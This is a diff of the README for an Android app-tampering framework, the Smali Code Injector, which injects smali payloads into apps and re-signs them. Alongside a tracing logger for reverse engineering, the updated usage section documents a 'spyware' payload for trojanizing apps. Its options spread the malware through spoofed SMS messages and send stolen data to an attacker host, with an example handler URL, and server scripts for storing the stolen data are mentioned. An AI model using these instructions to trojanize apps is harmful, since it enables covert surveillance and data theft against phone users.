@@ -1,14 +1,18 @@
 ![SCI](images/sci_logo.jpg)
-# Smali Code Injector
+# Smali Code Injector (SCI)
 ## Automate assembly code (**smali**) injection within Android applications.
 
 The initial ambition of this project was to automate stack trace injections within Android applications in order to facilitate my master thesis work. Being able to log and display applications' runtime method calls along with their returned value greatly helps in reverse engineering complex applications by providing an insight into their logic and workflow. 
 
-Lately, new features and payloads were added in an attempt to create a framework fully capable of injecting any type of assembly code. Users familiar with Android development can easily implement compatible payloads. SCI is in charge of automating low level operation such as registers allocation, dependancie, type, etc. 
+Then, new features and payloads were progressively added in an attempt to create a framework fully capable of injecting any type of assembly code. Users familiar with Android development can easily implement compatible payloads. SCI is in charge of automating low level operation such as registers allocation, dependancie, type, etc. 
 
 *Tampering Android applications has never been that easy!*
 
 More information about Android reverse engineering can be found at:
+
+<https://www.slideshare.net/slideshow/embed_code/key/6kQq5IjSldDWLl>
+
+More information about my master thesis work can be found at:
 
 <http://www.n00blinuxhacker.com/android-pentesting-reverse-engineering-android-app.html>
 
@@ -19,88 +23,98 @@ A high level overview of the steps involved during code injection is:
 
 1. Disassembling the application.
 2. Collecting relevant information about the application. 
-	* Classes name.
-	* Methods name.
-	* Registers number and type.
-	* etc.
+    * Classes name.
+    * Methods name.
+    * Registers number and type.
+    * etc.
 3. Editing the AndroidManifest.xml to add permissions, services and broadcastReceivers (depending on the payload requirements).
-4. Injecting and tweaking up the selected payload within the targeted method(s).
+4. Injecting and tweaking up the selected payload within the targeted method(s). Some Android libraries are also injected in order to defeat obfuscation.
 5. Reassembling and signing the app with a valid self-signed certificate.
 
 ## Usage
 ### Examples:
 #### Generic usage:
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p [payload] -rh [remote_host] -ppg [spoofed_SMS] -s
-		
-	[-a]: 	applicaion to modify.
-	[-t]: 	directory/file where to recursively perform the injection. If this argument is absent, the injection is performed within the whole app.
-	[-k]: 	keywords to filter on. Ex: if -k "SSL,X509TrustManager" the payload will only be injected on the method containing SSL in their declaration header - help for certificate unpinning -.
-	[-p]: 	payload to inject. 
-	[-ppg]:	spoofed SMS content to send - to propagate the malware -.
-	[-rh]:  IP address of the attacker/script for sending the stolen data.
-	[-s]:	search for the main activity.
+    $ python3 sci.py -a APP {search,payload}
 
-Identify the main activity - works with obfuscated apps -:
+    -a APP, --app APP  	Android application to trojanize
 
-		$ python3 sci.py -a [apps] -s
-		
-Display the help menu:
+    positional arguments:
+        search          search command - identifies the main activity
+        payload         payload command
 
-		$ python3 sci.py -h
-		
-#### Spyware usage:
+#### Search usage:
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p spyware -rh [script] -ppg [spoofed_SMS] 
-    
-	[-ppg]:	link with the malicious app. 
-	[-rh]: 	IP of the remote receiver (or URL of the file responsible for the JSON data handling and parsing (a script example can be found under /scripts/handler.php - do not forget to change the settings to connect to your DB -).
+    $ python3 sci.py -a APP search
 
-*Advice*: Inject the Spyware on the **onCreate()** method of the main activity.
-		
-#### Logger usage:
+    -a APP, --app APP   Android application to trojanize
 
-		$ python3 sci.py -a [app] -t [target] -k [keyword] -p logger
+#### Payload usage:
 
-Connect a smartphone to a computer and launch *adb* with the following command to display an app runtime method calls:
+    $ python3 sci.py -a APP payload [-d DESTINATION] [-k KEYWORDS] {logger,spyware}
 
-		$ adb logcat | grep "::trace"
+    -a APP, --app APP   Android application to trojanize
+    -d DESTINATION, --dest DESTINATION
+                        the destination file or directoy for injection
+    -k KEYWORDS, --keywords KEYWORDS
+                        keywords (separated by ',') for injection filtering
 
-## Dependencies
-### Third-party libraries
-#### colorama 0.3.7:
-The *python3-colorama* package is required. 
+    positional arguments:
+        logger          logger command
+        spyware         spyware command
 
-<https://pypi.python.org/pypi/colorama>
+##### Logger usage:
 
-#### tqdm 4.8.4: 
-The *python3-tqdm* package is required. 
+    $ python3 sci.py -a APP [-d DESTINATION] [-k KEYWORDS] logger
 
-<https://pypi.python.org/pypi/tqdm>  
+    -a APP, --app APP   Android application to trojanize
+    -d DESTINATION, --dest DESTINATION
+                        the destination file or directoy for injection
+    -k KEYWORDS, --keywords KEYWORDS
+                        keywords (separated by ',') for injection filtering
 
-## Future Improvements
-* Add new payloads (reverse shell).
-* Source code optimisation.
+Launch the Android debugger *adb* using the following command to view application's runtime method calls:
+
+    $ adb logcat | grep "::trace"
+
+##### Spyware usage:
+
+    $ sci.py -a APP payload [-d DESTINATION] [-k KEYWORDS] spyware [-h] -ppg PROPAGATE -rh RHOST
+
+    -a APP, --app APP   Android application to trojanize
+    -d DESTINATION, --dest DESTINATION
+                        the destination file or directoy for injection
+    -k KEYWORDS, --keywords KEYWORDS
+                        keywords (separated by ',') for injection filtering
+    -ppg PROPAGATE, --propagate PROPAGATE
+                        spoofed SMS to send for the malware propagation
+    -rh RHOST, --rhost RHOST
+                        attacker's host/ip for stolen data transmission, e.g.
+                        http://192.168.0.24/handler.php
+
+*Note*: For optimal results, inject Spyware on the *onCreate()* method of the application main activity.
+
+Server-side scripts to insert and store the stolen data sent to the attacker into a MySQL database are available under the *scripts* folder.
+
+To enable the Spyware debugging mode set the *DEV_MODE* variable to *true* in *payloads\smali\spyware* line 7. Then launch the Android debugger *adb* using the following command:
+
+    $ adb logcat | grep "::trace"
+
+## Possible Improvements
+* Create new payloads (e.g. a reverse shell).
+* Optimise the source code.
 
 ## Project Information
 This framework was developed in the context of my master thesis work in July 2015.	
 
+## Dependencies
+### Third-party libraries
+#### tqdm 4.8.4: 
+The *python3-tqdm* package is required. 
+
+<https://pypi.python.org/pypi/tqdm>
+
 ## Licenses
-### Smali Code Injector:
-   Copyright (C) 2015 Alexandre Teyar
-
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
-
-<http://www.apache.org/licenses/LICENSE-2.0>
-
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-   limitations under the License. 
-
 ### Apktool:
    Copyright (C) 2010 Ryszard Wiśniewski 
 
@@ -157,3 +171,18 @@ DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+### Smali Code Injector (SCI):
+   Copyright (C) 2015 Alexandre Teyar
+
+Licensed under the Apache License, Version 2.0 (the "License");
+you may not use this file except in compliance with the License.
+You may obtain a copy of the License at
+
+<http://www.apache.org/licenses/LICENSE-2.0>
+
+Unless required by applicable law or agreed to in writing, software
+distributed under the License is distributed on an "AS IS" BASIS,
+WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+See the License for the specific language governing permissions and
+   limitations under the License. 
